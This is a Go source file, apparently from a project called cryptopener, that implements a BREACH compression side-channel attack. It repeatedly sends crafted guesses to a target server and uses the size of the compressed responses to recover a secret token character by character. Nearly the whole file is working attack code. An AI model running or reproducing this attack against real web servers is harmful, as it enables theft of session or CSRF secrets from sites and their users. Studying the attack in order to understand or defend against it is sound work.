package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	"math/rand"
	"time"

	client "github.com/larikuistio/cryptopener/client"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	TokenLength int
	ResultToken string
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string, length int) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
		TokenLength: length,
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) int {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)
	return int(size)
}

func createPadding() string {
	dummy_chars := "!#&%$*+-(){}"
	ret := ""
	for i := 0; i < 8; i++ {
		ret = ret + string(dummy_chars[rand.Intn(11)])
	}
	return ret
}

func Pow(x int, n int) int {
	var ret int
	if n == 0 {
		ret = 1
	} else {
		ret = x
		for i := 0; i < n - 1; i++ {
			ret = x * ret
		}
	}
	return ret
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rand.Seed(time.Now().Unix())
	dummy_chars := "!#&%$*+-(){}"
	checkBaseLength := true
	base_length := 0
	temp_length := 0
	correct_count := 0
	x := 1
	y := 0
	p.ResultToken = ""
	padding := ""
	for {
		var payload []byte
		y = 0
		y = Pow(p.mutator.tokenCount, x)

		if checkBaseLength {
			// create new payload
			for i := 0; i < x; i++ {
				payload = []byte(string(payload) + string(dummy_chars[rand.Intn(11)]))
			}
			payload = []byte(p.ResultToken + string(payload))
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			base_length = p.analyseResponse(response)
			checkBaseLength = false
		} else {
			// create new payload
			mutpayload, _ := p.mutator.NewPayload(false)
			payload = []byte(p.ResultToken + string(mutpayload))
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			temp_length = p.analyseResponse(response)
			if temp_length < base_length {
				p.ResultToken = string(p.ResultToken) + string(mutpayload)
				p.mutator = NewMutator()
				checkBaseLength = true
				correct_count++
				x = 1
			} else if p.mutator.mutations - int64(y) == 0 {
				x++
				checkBaseLength = true
				if x % 2 == 0 {
					padding = padding + createPadding()
				}
			}
		}

		if correct_count == p.TokenLength {
			log.Printf("The guessed token is %s", p.ResultToken)
			break
		}
	}
}
